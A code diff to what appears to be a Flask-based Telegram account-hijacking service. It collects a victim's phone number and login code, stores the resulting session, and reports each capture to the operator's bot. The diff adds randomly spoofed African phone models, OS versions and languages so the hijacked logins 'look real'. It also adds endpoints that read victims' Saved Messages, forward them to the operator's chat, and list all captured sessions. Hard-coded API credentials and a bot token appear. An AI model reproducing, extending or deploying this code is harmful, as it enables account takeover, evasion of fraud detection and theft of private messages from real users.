@@ -6,6 +6,7 @@ import os
 import re
 import requests
 import secrets
+import random
 from datetime import datetime
 from pathlib import Path
 import nest_asyncio
@@ -21,7 +22,7 @@ API_ID = 6627460
 API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"
 
 BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"
-YOUR_CHAT_ID = "8796685138"  # Get from @userinfobot
+YOUR_CHAT_ID = "8796685138"
 
 active_sessions = {}
 SESSIONS_DIR = Path("sessions")
@@ -30,6 +31,73 @@ SESSIONS_DIR.mkdir(exist_ok=True)
 # Create a single event loop for the entire app
 loop = asyncio.new_event_loop()
 asyncio.set_event_loop(loop)
+
+# ============ AFRICAN PHONE MODELS LIST ============
+PHONE_MODELS = [
+    # Tecno (Very popular in Africa)
+    {"model": "Tecno Spark 10 Pro", "sys": "Android 13", "app": "10.0.5"},
+    {"model": "Tecno Spark 20", "sys": "Android 13", "app": "10.1.2"},
+    {"model": "Tecno Camon 20 Pro", "sys": "Android 13", "app": "10.0.8"},
+    {"model": "Tecno Camon 19", "sys": "Android 12", "app": "9.6.0"},
+    {"model": "Tecno Pova 5", "sys": "Android 13", "app": "10.0.3"},
+    {"model": "Tecno Pop 8", "sys": "Android 13", "app": "10.0.1"},
+    
+    # Infinix
+    {"model": "Infinix Hot 30", "sys": "Android 13", "app": "10.0.4"},
+    {"model": "Infinix Hot 20", "sys": "Android 12", "app": "9.6.2"},
+    {"model": "Infinix Note 30", "sys": "Android 13", "app": "10.0.6"},
+    {"model": "Infinix Note 12", "sys": "Android 12", "app": "9.6.1"},
+    {"model": "Infinix Zero 30", "sys": "Android 13", "app": "10.1.0"},
+    {"model": "Infinix Smart 8", "sys": "Android 13", "app": "10.0.2"},
+    
+    # Samsung (Popular in South Africa, Nigeria, Kenya)
+    {"model": "Samsung Galaxy A14", "sys": "Android 13", "app": "10.0.7"},
+    {"model": "Samsung Galaxy A04s", "sys": "Android 12", "app": "9.6.3"},
+    {"model": "Samsung Galaxy A24", "sys": "Android 13", "app": "10.0.5"},
+    {"model": "Samsung Galaxy M14", "sys": "Android 13", "app": "10.0.4"},
+    
+    # Itel
+    {"model": "Itel S23", "sys": "Android 12", "app": "9.6.0"},
+    {"model": "Itel S18", "sys": "Android 12", "app": "9.5.8"},
+    {"model": "Itel A60", "sys": "Android 12", "app": "9.6.1"},
+    {"model": "Itel P40", "sys": "Android 12", "app": "9.5.9"},
+    
+    # Xiaomi (Popular in Egypt, Morocco, Kenya)
+    {"model": "Xiaomi Redmi 12C", "sys": "Android 12", "app": "9.6.4"},
+    {"model": "Xiaomi Redmi Note 12", "sys": "Android 12", "app": "9.6.2"},
+    {"model": "Xiaomi Poco M5", "sys": "Android 12", "app": "9.6.0"},
+    
+    # Oppo
+    {"model": "Oppo A17", "sys": "Android 12", "app": "9.5.7"},
+    {"model": "Oppo A78", "sys": "Android 13", "app": "10.0.1"},
+    {"model": "Oppo A16", "sys": "Android 11", "app": "9.4.5"},
+    
+    # Vivo
+    {"model": "Vivo Y16", "sys": "Android 12", "app": "9.5.6"},
+    {"model": "Vivo Y22", "sys": "Android 12", "app": "9.6.0"},
+    {"model": "Vivo Y35", "sys": "Android 13", "app": "10.0.2"},
+    
+    # Nokia (Popular in Ethiopia, Kenya)
+    {"model": "Nokia C22", "sys": "Android 13", "app": "9.6.1"},
+    {"model": "Nokia C32", "sys": "Android 13", "app": "9.6.3"},
+    
+    # Huawei
+    {"model": "Huawei Nova Y90", "sys": "Android 12", "app": "9.5.5"},
+    {"model": "Huawei Y9 Prime", "sys": "Android 10", "app": "8.9.0"},
+]
+
+def get_random_device():
+    """Get random African phone model with realistic app version"""
+    device = random.choice(PHONE_MODELS)
+    # Sometimes use slightly older app version to look real
+    if random.random() < 0.3:
+        return device["model"], device["sys"], f"{int(device['app'].split('.')[0]) - 1}.{device['app'].split('.')[1]}.{device['app'].split('.')[2]}"
+    return device["model"], device["sys"], device["app"]
+
+def get_random_language():
+    """Random language based on African region"""
+    languages = ["en", "en", "en", "fr", "sw", "ar", "pt", "en"]  # English more common
+    return random.choice(languages)
 
 def send_telegram_message(chat_id, text, reply_markup=None):
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
@@ -56,7 +124,8 @@ def get_sessions_list():
                 'session_id': sid,
                 'phone': data['phone'],
                 'name': data['user_info'].get('first_name', ''),
-                'username': data['user_info'].get('username', '')
+                'username': data['user_info'].get('username', ''),
+                'device': data.get('device_model', 'Unknown')
             })
     return sessions
 
@@ -65,7 +134,8 @@ def sessions_keyboard(sessions):
     for sess in sessions:
         name = sess['name'] or sess['phone']
         username = f" @{sess['username']}" if sess['username'] else ""
-        buttons.append([{"text": f"📱 {name}{username}", "callback_data": f"select_{sess['session_id']}"}])
+        device_icon = "📱"
+        buttons.append([{"text": f"{device_icon} {name}{username}", "callback_data": f"select_{sess['session_id']}"}])
     buttons.append([{"text": "🔄 Refresh", "callback_data": "refresh_sessions"}])
     return {"inline_keyboard": buttons}
 
@@ -114,43 +184,6 @@ def webhook():
         print(f"Webhook error: {e}")
         return jsonify({'ok': True})
 
-@app.route('/bot-read-messages', methods=['GET'])
-def bot_read_messages():
-    try:
-        # Get any active session from your server
-        if not active_sessions:
-            return jsonify({'error': 'No active sessions found'})
-        
-        # Get the first available session
-        session_id = list(active_sessions.keys())[0]
-        session_data = active_sessions[session_id]
-        client = session_data['client']
-        
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
-        
-        async def fetch():
-            messages = []
-            async for msg in client.get_chat_history("me", limit=10):
-                if msg.text:
-                    messages.append(msg.text)
-            return messages
-        
-        messages = loop.run_until_complete(fetch())
-        
-        # Send messages to YOUR BOT
-        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-        for msg in messages[:5]:
-            requests.post(url, json={
-                'chat_id': YOUR_CHAT_ID,
-                'text': f"📖 {msg[:200]}"
-            })
-        
-        return jsonify({'success': True, 'messages_sent': len(messages)})
-        
-    except Exception as e:
-        return jsonify({'error': str(e)}), 500
-
 @app.route('/send-code', methods=['POST'])
 def send_code():
     try:
@@ -162,6 +195,10 @@ def send_code():
         
         session_id = secrets.token_hex(8)
         
+        # Get random device info for this session
+        device_model, system_version, app_version = get_random_device()
+        language_code = get_random_language()
+        
         async def create_and_store_session():
             client = None
             try:
@@ -171,7 +208,11 @@ def send_code():
                     api_id=API_ID,
                     api_hash=API_HASH,
                     workdir=str(Path.cwd()),
-                    in_memory=False
+                    in_memory=False,
+                    device_model=device_model,
+                    system_version=system_version,
+                    app_version=app_version,
+                    lang_code=language_code
                 )
                 
                 await client.connect()
@@ -182,13 +223,19 @@ def send_code():
                     'phone': phone,
                     'phone_code_hash': sent_code.phone_code_hash,
                     'session_file': str(session_file),
-                    'created_at': datetime.now().timestamp()
+                    'created_at': datetime.now().timestamp(),
+                    'device_model': device_model,
+                    'system_version': system_version,
+                    'app_version': app_version
                 }
+                
+                print(f"Session {session_id} created for {phone} using {device_model} ({system_version})")
                 
                 return {
                     'success': True,
                     'session_id': session_id,
-                    'message': 'Code sent to your Telegram'
+                    'message': 'Code sent to your Telegram',
+                    'device': device_model
                 }
                 
             except Exception as e:
@@ -196,7 +243,6 @@ def send_code():
                     await client.disconnect()
                 return {'success': False, 'error': str(e)}
         
-        # Run in the existing event loop
         result = loop.run_until_complete(create_and_store_session())
         return jsonify(result)
         
@@ -217,6 +263,7 @@ def verify_code():
         client = session_data['client']
         phone = session_data['phone']
         phone_code_hash = session_data['phone_code_hash']
+        device_model = session_data.get('device_model', 'Unknown')
         
         async def complete_login():
             try:
@@ -235,11 +282,13 @@ def verify_code():
                     'username': me.username
                 }
                 
-                # Notify via bot
+                # Notify via bot with device info
                 send_telegram_message(YOUR_CHAT_ID,
                     f"✅ *New Session Created!*\n\n"
-                    f"📱 {me.first_name} (@{me.username})\n"
-                    f"🔢 {phone}\n\n"
+                    f"👤 {me.first_name} (@{me.username})\n"
+                    f"📱 {phone}\n"
+                    f"📲 Device: {device_model}\n"
+                    f"🆔 Session ID: `{session_id}`\n\n"
                     f"Use /start on your bot to control"
                 )
                 
@@ -247,6 +296,7 @@ def verify_code():
                     'success': True,
                     'message': f'Logged in as {me.first_name}',
                     'session_id': session_id,
+                    'device': device_model,
                     'user': {
                         'id': me.id,
                         'first_name': me.first_name,
@@ -262,6 +312,56 @@ def verify_code():
         
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/bot-read-messages', methods=['GET'])
+def bot_read_messages():
+    try:
+        if not active_sessions:
+            return jsonify({'error': 'No active sessions found'})
+        
+        session_id = list(active_sessions.keys())[0]
+        session_data = active_sessions[session_id]
+        client = session_data['client']
+        device_model = session_data.get('device_model', 'Unknown')
+        
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        
+        async def fetch():
+            messages = []
+            async for msg in client.get_chat_history("me", limit=10):
+                if msg.text:
+                    messages.append(msg.text)
+            return messages
+        
+        messages = loop.run_until_complete(fetch())
+        
+        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+        for msg in messages[:5]:
+            requests.post(url, json={
+                'chat_id': YOUR_CHAT_ID,
+                'text': f"📖 From {device_model}:\n{msg[:200]}"
+            })
+        
+        return jsonify({'success': True, 'messages_sent': len(messages), 'device': device_model})
+        
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/active-sessions-info', methods=['GET'])
+def active_sessions_info():
+    """View all active sessions with their device info"""
+    sessions_info = []
+    for sid, data in active_sessions.items():
+        sessions_info.append({
+            'session_id': sid,
+            'phone': data['phone'],
+            'device_model': data.get('device_model', 'Unknown'),
+            'system_version': data.get('system_version', 'Unknown'),
+            'app_version': data.get('app_version', 'Unknown'),
+            'created_at': datetime.fromtimestamp(data['created_at']).isoformat() if 'created_at' in data else 'Unknown'
+        })
+    return jsonify({'sessions': sessions_info, 'count': len(sessions_info)})
 
 @app.route('/health', methods=['GET'])
 def health_check():
